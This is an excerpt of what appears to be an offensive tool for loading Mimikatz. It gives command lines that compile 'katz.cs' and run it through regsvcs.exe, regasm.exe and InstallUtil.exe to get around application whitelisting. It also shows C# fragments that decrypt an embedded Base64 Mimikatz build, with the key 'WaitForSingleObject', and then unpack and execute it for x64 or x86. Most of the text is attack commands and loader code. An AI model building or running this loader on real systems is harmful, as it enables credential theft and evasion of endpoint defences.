...
C:\Windows\Microsoft.NET\Framework\v4.0.30319 /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs

C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe katz.exe 
x64
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe katz.exe 

[OR]
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe katz.exe
//Executes UnRegisterClass If you don't have permissions

C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U katz.exe 
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U katz.exe
xC:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U katz.exe
//This calls the UnregisterClass Method

[OR]

C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U katz.exe
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U katz.exe
...
// Find/Replace All "WaitForSingleObject"
        ...
        public static void Main(string[] args)
        {
            if(args.Length == 2) {
                if(args[0] == "encrypt") {
                    ...
                    byte[] e = Misc.Encrypt(b,"WaitForSingleObject");
        ...
        public static void Exec()
        {
            ...
            try
            {
				...
				if (IntPtr.Size == 8 ) 
				{
					...
					latestMimikatz = Misc.Decrypt(Convert.FromBase64String(Package.filex64), "WaitForSingleObject"); //Yes, this is a bad idea. 

				}
				else if (IntPtr.Size == 4 )
				{
					//x86 Unpack And Execute
					latestMimikatz = Misc.Decrypt(Convert.FromBase64String(Package.filex86), "WaitForSingleObject"); //Yes, this is a bad idea. 
